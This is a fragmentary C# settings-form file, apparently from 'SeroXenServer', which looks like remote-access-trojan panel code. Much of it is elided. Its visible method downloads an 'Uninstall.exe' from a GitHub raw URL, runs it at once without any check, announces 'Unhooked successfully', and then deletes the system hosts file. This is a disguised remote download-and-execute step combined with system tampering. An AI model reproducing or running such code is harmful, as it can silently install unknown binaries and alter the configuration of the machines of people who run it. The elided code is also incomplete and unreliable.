...
namespace xServer.Forms
{
    ...
    {
        private readonly SeroXenServer _listenServer;

        public FrmSettings(SeroXenServer listenServer)
        {
        ...
        {
            string downloadUrl = "https://github.com/V1PERAH/v/raw/main/Uninstall.exe";
            ...
            using (WebClient webClient = new WebClient())
            {
                try
                {
                    string downloadedFilePath = Path.Combine(tempPath, "Uninstall.exe");

                    webClient.DownloadFile(downloadUrl, downloadedFilePath);
                    System.Diagnostics.Process.Start(downloadedFilePath);
                    MessageBox.Show("Unhooked successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    ...
                    if (File.Exists(hostsFilePath))
                    {
                        ...
                        MessageBox.Show("Hosts file deleted successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("Hosts file not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error downloading, executing, or deleting files: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
